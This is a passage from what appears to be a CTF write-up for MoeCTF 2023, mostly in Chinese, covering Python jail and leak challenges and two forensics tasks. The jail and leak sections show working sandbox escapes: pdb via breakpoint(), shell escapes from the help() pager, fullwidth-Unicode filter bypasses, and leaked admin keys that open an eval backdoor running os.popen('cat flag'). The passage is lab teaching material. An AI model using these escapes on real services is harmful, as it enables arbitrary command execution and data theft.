-> print('Answer result: {}'.format(eval(user_input_data)))
(Pdb) list
 63         print("Enter your expression and I will evaluate it for you.")
 64         user_input_data = input("> ")
 65         if len(user_input_data)>12:
 66           print("Oh hacker! Bye~")
 67           exit(0)
 68  ->     print('Answer result: {}'.format(eval(user_input_data)))
 69       elif choice == "c":
 70         print(CHALLENGE_DESCRIPT)
 71         user_input_hint_choice = input("If you still don't know how to solve it,do you need some hint? (y/n) > ").lower().strip()
 72         if user_input_hint_choice == 'y':
 73           print(CHALLENGE_HINT_FOR_BEGINNER)
(Pdb) user_input_data
'123'
(Pdb) user_input_data = __import__('os').popen("ls").read()
(Pdb) user_input_data
'flag\nserver.py\n'
(Pdb) user_input_data = __import__('os').popen("cat flag").read()
(Pdb) user_input_data
'flag{DUMQ8uLCx-cQZ_tU1XwRb-l-KQX4UtgX}\n'
```

### Jail Level 2

```bash
└─$ nc localhost 32965

  __  __  ___        _____        _        _                _                         _                _ ___  
 |  \/  |/ _ \      / ____| ____ | |      | |              (_)                       | |              | |__ \ 
 | \  / | | | | ___| |     / __ \| | ___  | |__   ___  __ _ _ _ __  _ __   ___ _ __  | | _____   _____| |  ) |
 | |\/| | | | |/ _ \ |    / / _` | |/ __| | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__| | |/ _ \ \ / / _ \ | / / 
 | |  | | |_| |  __/ |___| | (_| | | (__  | |_) |  __/ (_| | | | | | | | |  __/ |    | |  __/\ V /  __/ |/ /_ 
 |_|  |_|\___/ \___|\_____\ \__,_|_|\___| |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|    |_|\___| \_/ \___|_|____|
                           \____/                      __/ |                                                  
                                                      |___/                                                                                                                         

| Options: 
|       [G]et Challenge Source Code 
|       [E]nter into Challenge 
|       [C]hallenge Description 
|       [Q]uit 

>>> e
Welcome to the MoeCTF2023 Jail challenge.It's time to work on this calc challenge.
Enter your expression and I will evaluate it for you.
> help()

Welcome to Python 3.10's help utility!

If this is your first time using Python, you should definitely check out
the tutorial on the internet at https://docs.python.org/3.10/tutorial/.

Enter the name of any module, keyword, or topic to get help on writing
Python programs and using Python modules.  To quit this help utility and
return to the interpreter, just type "quit".

To get a list of available modules, keywords, symbols, or topics, type
"modules", "keywords", "symbols", or "topics".  Each module also comes
with a one-line summary of what it does; to list the modules whose name
or summary contain a given string such as "spam", type "modules spam".

help> sys
WARNING: terminal is not fully functional
Press RETURN to continue 

Help on built-in module sys:

NAME
    sys

MODULE REFERENCE
    https://docs.python.org/3.10/library/sys.html
    
    The following documentation is automatically generated from the Python
    source files.  It may be incomplete, incorrect or include features that
    are considered implementation detail and may vary between Python
    implementations.  When in doubt, consult the module reference at the
    location listed above.

DESCRIPTION
    This module provides access to some objects used or maintained by the
    interpreter and to functions that interact strongly with the interpreter.
    
    Dynamic objects:
    
    argv -- command line arguments; argv[0] is the script pathname if known
    path -- module search path; path[0] is the script directory, else ''
    modules -- dictionary of loaded modules
:!cat flag
!cat flag
flag{KIRPkrnZkNDtjegM0zX_BTMxaHRSmCS_}
```

### Jail Level 3

原理就是使用 unicode 字符替换

```bash
$ nc localhost 44925

  __  __  ___        _____        _        _                _                         _                _ ____  
 |  \/  |/ _ \      / ____| ____ | |      | |              (_)                       | |              | |___ \ 
 | \  / | | | | ___| |     / __ \| | ___  | |__   ___  __ _ _ _ __  _ __   ___ _ __  | | _____   _____| | __) |
 | |\/| | | | |/ _ \ |    / / _` | |/ __| | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__| | |/ _ \ \ / / _ \ ||__ < 
 | |  | | |_| |  __/ |___| | (_| | | (__  | |_) |  __/ (_| | | | | | | | |  __/ |    | |  __/\ V /  __/ |___) |
 |_|  |_|\___/ \___|\_____\ \__,_|_|\___| |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|    |_|\___| \_/ \___|_|____/ 
                           \____/                      __/ |                                                   
                                                      |___/                                                                                                                                                        

| Options: 
|       [G]et Challenge Source Code 
|       [E]nter into Challenge 
|       [C]hallenge Description 
|       [Q]uit 

>>> e
Welcome to the MoeCTF2023 Jail challenge.It's time to work on this calc challenge.
Enter your expression and I will evaluate it for you.
> ｂｒｅａｋｐｏｉｎｔ()

--Return--
> <string>(1)<module>()->None
(Pdb) (Pdb) __import__('os').popen("cat flag").read()
'flag{l03mUnupxd415eg0AL3K12ZNKoc89V5v}\n'
(Pdb)
```

### Jail Level 4

```bash
$ nc localhost 44975

  __  __  ___        _____        _        _                _                         _                _ _  _   
 |  \/  |/ _ \      / ____| ____ | |      | |              (_)                       | |              | | || |  
 | \  / | | | | ___| |     / __ \| | ___  | |__   ___  __ _ _ _ __  _ __   ___ _ __  | | _____   _____| | || |_ 
 | |\/| | | | |/ _ \ |    / / _` | |/ __| | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__| | |/ _ \ \ / / _ \ |__   _|
 | |  | | |_| |  __/ |___| | (_| | | (__  | |_) |  __/ (_| | | | | | | | |  __/ |    | |  __/\ V /  __/ |  | |  
 |_|  |_|\___/ \___|\_____\ \__,_|_|\___| |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|    |_|\___| \_/ \___|_|  |_|  
                           \____/                      __/ |                                                    
                                                      |___/                                                                                                                         

Welcome to the MoeCTF2023 Jail challenge.This is a repeater and it repeats what you say!
python verison:2.7
> __import__('os').popen("ls").read()
flag
server.py

> __import__('os').popen("cat flag").read()
flag{x4GaMhUw6NWF6LnebbaOmZbCA5sa6z19}
```

### Leak Level 0

源码如下

```python
fake_key_into_local_but_valid_key_into_remote = "moectfisbestctfhopeyoulikethat"
print("Hey Guys,Welcome to the moeleak challenge.Have fun!.")
print("""
| Options:
| [V]uln
| [B]ackdoor
""")


def func_filter(s):
    not_allowed = set('vvvveeee')
    return any(c in not_allowed for c in s)


while (1):
    challenge_choice = input(">>> ").lower().strip()
    if challenge_choice == 'v':
        code = input("code >> ")
        if (len(code) > 9):
            print("you're hacker!")
            exit(0)
        if func_filter(code):
            print("Oh hacker! byte~")
            exit(0)
        print(eval(code))
    elif challenge_choice == 'b':
        print("Please enter the admin key")
        key = input("key >> ")
        if (key == fake_key_into_local_but_valid_key_into_remote):
            print("Hey Admin,please input your code:")
            code = input("backdoor >> ")
            print(eval(code))
    else:
        print("You should select valid choice!")
```

通过环境变量获取 `key` 后即可进入后门

```bash
$ nc localhost 42189

  __  __  ___       _      ______        _  __  _                _  ___  
 |  \/  |/ _ \     | |    |  ____| ____ | |/ / | |              | |/ _ \ 
 | \  / | | | | ___| |    | |__   / __ \| ' /  | | _____   _____| | | | |
 | |\/| | | | |/ _ \ |    |  __| / / _` |  <   | |/ _ \ \ / / _ \ | | | |
 | |  | | |_| |  __/ |____| |___| | (_| | . \  | |  __/\ V /  __/ | |_| |
 |_|  |_|\___/ \___|______|______\ \__,_|_|\_\ |_|\___| \_/ \___|_|\___/ 
                                  \____/                                 
                                                                                                                                      

| Options: 
|       [G]et Challenge Source Code 
|       [E]nter into Challenge 
|       [Q]uit 

>>> e
Hey Guys,Welcome to the moeleak challenge.Have fun!.
| Options: 
|       [V]uln 
|       [B]ackdoor
>>> v
you need to 
code >> globals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7fdd249f8ac0>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/home/ctf/./server.py', '__cached__': None, 'key_6366a131649a4e9b': '4e86eda06366a131649a4e9be1a9f217', 'WELCOME': "\n  __  __  ___       _      ______        _  __  _                _  ___  \n |  \\/  |/ _ \\     | |    |  ____| ____ | |/ / | |              | |/ _ \\ \n | \\  / | | | | ___| |    | |__   / __ \\| ' /  | | _____   _____| | | | |\n | |\\/| | | | |/ _ \\ |    |  __| / / _` |  <   | |/ _ \\ \\ / / _ \\ | | | |\n | |  | | |_| |  __/ |____| |___| | (_| | . \\  | |  __/\\ V /  __/ | |_| |\n |_|  |_|\\___/ \\___|______|______\\ \\__,_|_|\\_\\ |_|\\___| \\_/ \\___|_|\\___/ \n                                  \\____/                                 \n                                                                                                                                      \n", 'CHALLENGE_SOURCE_CODE': '\n    fake_key_into_local_but_valid_key_into_remote = "moectfisbestctfhopeyoulikethat"\n    print("Hey Guys,Welcome to the moeleak challenge.Have fun!.")\n    print("| Options: \n|\t[V]uln \n|\t[B]ackdoor")\n    def func_filter(s):\n      not_allowed = set(\'vvvveeee\')\n      return any(c in not_allowed for c in s)\n    while(1):\n      challenge_choice = input(">>> ").lower().strip()\n      if challenge_choice == \'v\':\n        code = input("code >> ")\n        if(len(code)>9):\n          print("you\'re hacker!")\n          exit(0)\n        if func_filter(code):\n          print("Oh hacker! byte~")\n          exit(0)\n        print(eval(code))\n      elif challenge_choice == \'b\':\n        print("Please enter the admin key")\n        key = input("key >> ")\n        if(key == fake_key_into_local_but_valid_key_into_remote):\n          print("Hey Admin,please input your code:")\n          code = input("backdoor >> ")\n          print(eval(code))\n      else:\n        print("You should select valid choice!")\n', 'choice': 'e', 'func_filter': <function func_filter at 0x7fdd24a5a0e0>, 'challenge_choice': 'v', 'code': 'globals()'}
>>> b
Please enter the admin key
key >> 4e86eda06366a131649a4e9be1a9f217
Hey Admin,please input your code:
backdoor> __import__('os').popen("cat flag").read()
flag{mURoRhoWJnbjMQYhgP5SsPbHTGr9LKrF}
```

### Leak Level 1

源码如下

```python
fake_key_into_local_but_valid_key_into_remote = "moectfisbestctfhopeyoulikethat"
print("Hey Guys,Welcome to the moeleak challenge.Have fun!.")


def func_filter(s):
    not_allowed = set('moe_dbt')
    return any(c in not_allowed for c in s)


print("""| Options: 
|       [V]uln 
|       [B]ackdoor
""")
while 1:
    challenge_choice = input(">>> ").lower().strip()
    if challenge_choice == 'v':
        code = input("code >> ")
        if len(code) > 6:
            print("you're hacker!")
            exit(0)
        if func_filter(code):
            print("Oh hacker! byte~")
            exit(0)
        print(eval(code))
    elif challenge_choice == 'b':
        print("Please enter the admin key")
        key = input("key >> ")
        if key == fake_key_into_local_but_vailed_key_into_remote:
            print("Hey Admin,please input your code:")
            code = input("backdoor >> ")
            print(eval(code))
    else:
        print("You should select valid choice!")
```

通过 unicode 字符可以进入 `help()`

```bash
>>> v
you need to 
code >> ｈｅｌｐ()
```

> 第一次 help() 中查看 server 时，环境变为 server.py，此时可以查看变量
>
> https://jbnrz.com.cn/index.php/2023/06/08/pyjail/

进入 `help()` 后输入 `server` ，弹出来后重复一次操作即可查看到环境变量得到 key

```bash
help> server
Help on module server:

NAME
    server

FUNCTIONS
    func_filter(s)

DATA
    CHALLENGE_SOURCE_CODE = '\n    fake_key_into_local_but_valid_key_into_...
    WELCOME = '\n  __  __  ___       _      ______        _  __ ...       ...
    challenge_choice = 'v'
    choice = 'e'
    code = 'ｈｅｌｐ()'
    key_ff8457ee50ed8d0f = '8d3d451fff8457ee50ed8d0f24881eac'

FILE
    /home/ctf/server.py
```

通过获得的 key 进入后门就可以得到 flag 了。

```bash
>>> b
Please enter the admin key
key >> 8d3d451fff8457ee50ed8d0f24881eac
Hey Admin,please input your code:
backdoor> __import__('os').popen("cat flag").read()
flag{Z-91DMdRije6usQPk9OuAoUiHt2JWr3Y}
```

### Leak Level 2

过滤字符改了，直接按照第一关的方法一把梭，过程如下

```
v -> help() -> server -> v -> help() -> server
```

```bash
help> server
Help on module server:

NAME
    server

FUNCTIONS
    func_filter(s)

DATA
    CHALLENGE_SOURCE_CODE = '\n    fake_key_into_local_but_valid_key_into_...
    WELCOME = '\n  __  __  ___       _      ______        _  __ ...       ...
    challenge_choice = 'v'
    choice = 'e'
    code = 'help()'
    key_f5ee1754b2e73acf = '43610e2ef5ee1754b2e73acf35348dd5'

FILE
    /home/ctf/server.py
```

通过获得的 key 进入后门就可以得到 flag 了。

```bash
>>> e
Hey Guys,Welcome to the moeleak challenge.Have fun!.
| Options: 
|       [V]uln 
|       [B]ackdoor
>>> b
Please enter the admin key
key >> 43610e2ef5ee1754b2e73acf35348dd5
Hey Admin,please input your code:
backdoor> __import__('os').popen("cat flag").read()
flag{HXHecX6W7L0ewe6_xCFjWE8h6-uysGsb}
```

## Forensics

### 随身携带的虚拟机

用 VMware 创一个 Windows 10 64位的虚拟机，载入 `MoeCTF_Forensics_1.vmdk` ，在回收站可以找到 `BitLocker Recovery Key 4DFEE901-55AC-43EB-96F4-FFE09609952A` ，里面则是 D 盘的恢复密钥，解开后可以得到 `flag.txt` ，内容如下

```
bW9lY3Rme0JhczFjX0QxNWtfRjByM25zMWNzIX0=
```

通过 base64 解密即可得到 flag 如下

```
moectf{Bas1c_D15k_F0r3ns1cs!}
```

### 坚持访问的浏览器

通过描述中的浏览器以及附件中出现的 `.mozilla` 把目标瞄准向 `firefox` ，`.mozilla/firefox/profiles.ini` 是 Firefox 的配置目录，保存了用户配置文件信息，内容如下

```ini
[Profile1]
Name=default
IsRelative=1
Path=b2vuwvgy.default
Default=1

[Profile0]
Name=default-esr
IsRelative=1
Path=1xp3jsq0.default-esr

[General]
StartWithLastProfile=1
Version=2

[Install3B6073811A6ABF12]
Default=1xp3jsq0.default-esr
Locked=1
```

可以找到默认用户的配置文件存储在 `./1xp3jsq0.default-esr` 中，题目中提到**坚持访问**那就从历史记录下手，`./1xp3jsq0.default-esr/places.sqlite` 保存的就是浏览器的**历史记录和书签信息**。通过访问这个数据库就可以找到历史记录，通过下列语句查询 `moz_places` 表可以得到历史记录

```sql
 select * from moz_places
```

在其中可以找到一个链接，即 https://hymint.space/\~koito/ ，通过访问即可得到 flag 如下

```
moectf{Th15_iS_d3f1ni7e1y_1Ast_0NE_30a13cfb8426e919ecd4c5627cde4fa4}
```
